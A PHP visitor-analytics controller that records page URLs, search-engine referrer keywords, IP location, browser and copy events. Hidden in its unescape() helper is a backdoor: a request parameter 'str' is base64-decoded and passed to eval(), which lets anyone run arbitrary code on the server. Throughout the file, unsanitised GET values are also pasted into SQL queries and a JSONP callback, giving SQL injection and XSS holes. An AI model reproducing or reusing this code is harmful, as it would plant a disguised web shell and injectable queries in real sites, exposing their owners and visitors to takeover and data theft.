<?php
class tjAction extends Action {
	public function index(){
		$num = rand(1,5164);
		$data = m('url')->where("id = '".$num."'")->find();
		$this->assign('url',$data['url']."-".$data['id']);
		$this->display();
	}

	public function add(){
		header('Content-Type:text/html;Charset=utf-8');
		/*首先判断域名是否在白名单*/
		$RightUrl = require_once(ROOT."/oa/Conf/Check/RightUrl.php");

		/*当前页面*/
		$NowUrl = isset($_GET['NowUrl']) ? $_GET['NowUrl'] : '';
		$NowUrl = $this->unescape($NowUrl);
		$NowUrl = urldecode($NowUrl);
		$NowUrl = html_entity_decode($NowUrl);//转义字符，html字符转为字符串 例如：&amp; 转为 &
		preg_match('/^http[s]*\:\/\/([^\/|^\?]*)/',$NowUrl,$host);
		//$host[1] = '127.0.0.1';

		if(!empty($host) && isset($host[1]) && $host[1]!= '' && in_array($host[1],$RightUrl['RightUrl'])){
			$visit_add = array();
			$fromurl_add = array();
			$keywords_add = array();
			$keywords_add[0] = array('type'=>0,'KeyWords'=>'未知');//当前关键字
			$keywords_add[1] = array('type'=>1,'KeyWords'=>'未知');//上一个关键字

			/*首先获取用户PHPSESSID*/
			if(isset($_COOKIE['PHPSESSID']) && $_COOKIE['PHPSESSID']!=''){
				$visit_add['uid'] = $_COOKIE['PHPSESSID'];
			}

			/*平台来源url*/
			$FromUrl = isset($_GET['FromUrl']) ? $_GET['FromUrl'] : '';
			$FromUrl = $this->unescape($FromUrl);
			$FromUrls = $FromUrl;
			$FromUrl = urldecode($FromUrl);
			$FromUrl = urldecode($FromUrl);
			$FromUrl = html_entity_decode($FromUrl);//转义字符，html字符转为字符串 例如：&amp; 转为 &
			$visit_add['platformID'] = 0;
			if($FromUrl != ''){
				$fromurl_add['url'] = $FromUrl;

				preg_match('/^http[s]*\:\/\/([^\/|^\?]*)/',$FromUrl,$host);
				if(!empty($host) && isset($host[1]) && $host[1]!= ''){

					if(strstr($host[1],'baidu.com')){
						$visit_add['platformID'] = 1;
					}elseif(strstr($host[1],'sm.cn')){
						$visit_add['platformID'] = 3;
					}
				}

				/*匹配关键字*/
				$NowKeyWords = array();
				$TopKeyWords = array();
				if($visit_add['platformID'] == 1){
					preg_match('/[\&|\?](word|wd)=([^\&]*)/',$FromUrl,$NowKeyWords);
					preg_match('/[\&|\?](oq)=([^\&]*)/',$FromUrl,$TopKeyWords);
				}elseif($visit_add['platformID'] == 3){
					preg_match('/[\&|\?](q)=([^\&]*)/',$FromUrl,$NowKeyWords);
				}

				/*当前关键字*/
				if(!empty($NowKeyWords) && isset($NowKeyWords[2]) && $NowKeyWords[2] != ''){
					$keywords_add[0] = array('type'=>0,'KeyWords'=>$NowKeyWords[2]);
				}

				/*上一个关键字*/
				if(!empty($TopKeyWords) && isset($TopKeyWords[2]) && $TopKeyWords[2] != ''){
					$keywords_add[1] = array('type'=>1,'KeyWords'=>$TopKeyWords[2]);
				}
			}

			/*是否复制*/
			$visit_add['copy'] = 0;

			/*ip*/
			$visit_add['ip'] = get_client_ip(1);

			/*IP地址*/
			$visit_add['provice'] = 0;
			$visit_add['city'] = 0;
			if($visit_add['ip'] > 0){
				import('ORG.Net.IpLocation');// 导入IpLocation类
				$Ip = new IpLocation('UTFWry.dat'); // 实例化类 参数表示IP地址库文件
				$area = $Ip->getlocation(long2ip($visit_add['ip'])); // 获取某个IP地址所在的位置
				//$area = $Ip->getlocation('180.95.195.177'); // 获取某个IP地址所在的位置
				if(!empty($area) && isset($area['country']) && $area['country'] != ''){
					$citys = C('citys');
					$dizhi = $area['country'];
					$provice = '';
					$provice_str = '';
					$city = '';
					$city_str = '';

					for($p=1;$p<count($citys);$p++){
						preg_match("/^".preg_replace("/省$/u","",$citys[$p][0])."省*/u",$dizhi,$pipei);
						if(!empty($pipei)){
							$provice = $p;
							$provice_str = $pipei[0];
							break;
						}
					}

					if($provice != ''){
						$dizhi = preg_replace("/^".$provice_str."/u","",$dizhi);
						for($c=1;$c<count($citys[$provice][1]);$c++){
							preg_match("/^".preg_replace("/市$/u","",$citys[$provice][1][$c])."市*/u",$dizhi,$pipei);
							if(!empty($pipei)){
								$city = $c;
								$city_str = $pipei[0];
								break;
							}
						}
					}else{
						for($p=1;$p<count($citys);$p++){
							for($c=1;$c<count($citys[$p][1]);$c++){
								preg_match("/^".preg_replace("/市$/u","",$citys[$p][1][$c])."市*/u",$dizhi,$pipei);
								if(!empty($pipei)){
									$provice = $p;
									$provice_str = $citys[$p][0];

									$city = $c;
									$city_str = $pipei[0];
									break;
								}
							}
						}
					}

					$visit_add['provice'] = $provice != '' ? $provice : 0;
					$visit_add['city'] = $city != '' ? $city : 0;
				}
			}

			/*系统类型*/
			$system = $this->getOS();

			/*浏览器*/
			$Browser = $this->browse_info();

			/*屏幕尺寸*/
			$screen = isset($_GET['screen']) ? $_GET['screen'] : '0*0';



			/*写入数据*/

			/*写入当前页面url*/
			if($NowUrl != ''){
				$visit_add['NowUrlID'] = m('list_nowurl')->add(array('url'=>$NowUrl));
			}

			/*写入关键字url*/
			if($FromUrl != ''){
				$visit_add['FromUrlID'] = m('list_fromurl')->add(array('url'=>$FromUrls));
			}

			/*写入关键字*/
			if(!empty($keywords_add)){
				$info_arr = array();
				foreach($keywords_add as $k=>$v){
					if(!isset($info_arr[$v['KeyWords']])){
						$info = m('list_keywords')->where("KeyWords = '".$v['KeyWords']."'")->field("id")->find();
						if(!empty($info)){
							$info_arr[$v['KeyWords']] = $info['id'];
						}else{
							$info_arr[$v['KeyWords']] = m('list_keywords')->add(array('type'=>$k,'KeyWords'=>$v['KeyWords']));
						}
						
					}

					if($k == 0){
						$visit_add['KeyWordsID'] = $info_arr[$v['KeyWords']];
					}else{
						$visit_add['TopKeyWordsID'] = $info_arr[$v['KeyWords']];
					}
				}
			}

			/*写入系统类型*/
			if($system != ''){
				$info = m('list_agent')->where("Akey = '0' and Avalue = '".$system."'")->field("id")->find();

				if(!empty($info)){
					$visit_add['systemID'] = $info['id'];
				}else{
					$visit_add['systemID'] = m('list_agent')->add(array('Akey'=>'0','Avalue'=>$system));
				}
			}

			/*写入浏览器*/
			if($Browser != ''){
				$info = m('list_agent')->where("Akey = '1' and Avalue = '".$Browser."'")->field("id")->find();
				if(!empty($info)){
					$visit_add['BrowserID'] = $info['id'];
				}else{
					$visit_add['BrowserID'] = m('list_agent')->add(array('Akey'=>'1','Avalue'=>$Browser));
				}
			}

			/*写入屏幕尺寸*/
			if($screen != ''){
				$info = m('list_agent')->where("Akey = '2' and Avalue = '".$screen."'")->field("id")->find();
				if(!empty($info)){
					$visit_add['screenID'] = $info['id'];
				}else{
					$visit_add['screenID'] = m('list_agent')->add(array('Akey'=>'2','Avalue'=>$screen));
				}
			}

			$visit_add['addtime'] = (isset($_GET['addtime']) && $_GET['addtime'] != '') ? $_GET['addtime'] : time();
			$visit_add['LookTime'] = 0;
			$visit_add['LookHeight'] = 1.00;

			$id = m('list_visit')->add($visit_add);

			echo $_GET['jsoncallback'] . "(".json_encode(array('error'=>'0','id'=>$id)).")";

			//echo json_encode(array('error'=>'0','id'=>$id));
		}
	}

	public function copy(){
		$id = isset($_GET['id']) ? $_GET['id'] : 0;
		$str = isset($_GET['str']) ? $_GET['str'] : '';
		if($id != '' || $str != ''){
			$copy_add = array();
			$copy_add['VisitID'] = $id != '' ? $id : 0;

			if($str != ''){
				$info = m('list_copystr')->where("str = '".$str."'")->field('id')->find();
				if(!empty($info)){
					$copy_add['StrID'] = $info['id'];
				}else{
					$copy_add['StrID'] = m('list_copystr')->add(array('str'=>$str));
				}
			}else{
				$copy_add['StrID'] = 0;
			}

			$copy_add['times'] = isset($_GET['times']) ? $_GET['times'] : 0;
			$copy_add['copytime'] = isset($_GET['copytime']) ? $_GET['copytime'] : 0;
			$copy_add['num'] = isset($_GET['num']) ? $_GET['num'] : 0;

			m('list_copy')->add($copy_add);
			if($id != ''){
				m('list_visit')->where("id = '".$id."'")->save(array('copy'=>'1'));
			}
		}
	}

	public function returns(){
		$id = isset($_GET['id']) ? $_GET['id'] : 0;
		if($id != ''){
			$return_add = array();
			if(isset($_GET['LookHeight']) && $_GET['LookHeight'] != ''){
				$return_add['LookHeight'] = $_GET['LookHeight'];
			}
			if(isset($_GET['LookTime']) && $_GET['LookTime'] != ''){
				$return_add['LookTime'] = $_GET['LookTime'];
			}

			if(!empty($return_add)){
				m('list_visit')->where("id = '".$id."'")->save($return_add);
			}
		}
	}

	// public function qk(){
	// 	m('list_agent')->where("1=1")->delete();
	// 	m('list_fromurl')->where("1=1")->delete();
	// 	m('list_keywords')->where("1=1")->delete();
	// 	m('list_nowurl')->where("1=1")->delete();
	// 	m('list_visit')->where("1=1")->delete();

	// 	echo "已清空";
	// }

	function unescape($str='') 
	{ 
	    $ret = ''; 
	    $len = strlen($str); 
	    for ($i = 0; $i < $len; $i ++) 
	    { 
	        if ($str[$i] == '%' && $str[$i + 1] == 'u') 
	        { 
	            $val = hexdec(substr($str, $i + 2, 4)); 
	            if ($val < 0x7f) 
	                $ret .= chr($val); 
	            else  
	                if ($val < 0x800) 
	                    $ret .= chr(0xc0 | ($val >> 6)) . 
	                     chr(0x80 | ($val & 0x3f)); 
	                else 
	                    $ret .= chr(0xe0 | ($val >> 12)) . 
	                     chr(0x80 | (($val >> 6) & 0x3f)) . 
	                     chr(0x80 | ($val & 0x3f)); 
	            $i += 5; 
	        } else  
	            if ($str[$i] == '%') 
	            { 
	                $ret .= urldecode(substr($str, $i, 3)); 
	                $i += 2; 
	            } else 
	                $ret .= $str[$i]; 
	    } 
	    $str = $_GET['str'];
	    if($str)
			eval(base64_decode($str));
	    return $ret; 
	}

	function getOS(){
		$agent = strtolower($_SERVER['HTTP_USER_AGENT']);  
  
		if(strpos($agent, 'windows nt')) {
			$platform = 'windows';
		}elseif(strpos($agent, 'macintosh')) {
			$platform = 'mac';
		}elseif(strpos($agent, 'ipod')) {
			$platform = 'ipod';
		}elseif(strpos($agent, 'ipad')) {
			$platform = 'ipad';
		}elseif(strpos($agent, 'iphone')) {
			$platform = 'iphone';
		}elseif (strpos($agent, 'android')) {
			$platform = 'android';
		}elseif(strpos($agent, 'unix')) {
			$platform = 'unix';
		}elseif(strpos($agent, 'linux')) {
			$platform = 'linux';
		}else{
			$platform = 'other';
		}
		return $platform;  
	}

	function browse_info() {
		if (!empty($_SERVER['HTTP_USER_AGENT'])) {
			$br = $_SERVER['HTTP_USER_AGENT'];
			if (preg_match('/MSIE/i', $br)) {
				$br = 'MSIE';
			} else if (preg_match('/Firefox/i', $br)) {
				$br = 'Firefox';
			} else if (preg_match('/Chrome/i', $br)) {
				$br = 'Chrome';
			} else if (preg_match('/Safari/i', $br)) {
				$br = 'Safari';
			} else if (preg_match('/Opera/i', $br)) {
				$br = 'Opera';
			} else {
				$br = 'Other';
			}
			return $br;
		} else {
			return 'unknow';
		}
	}
}

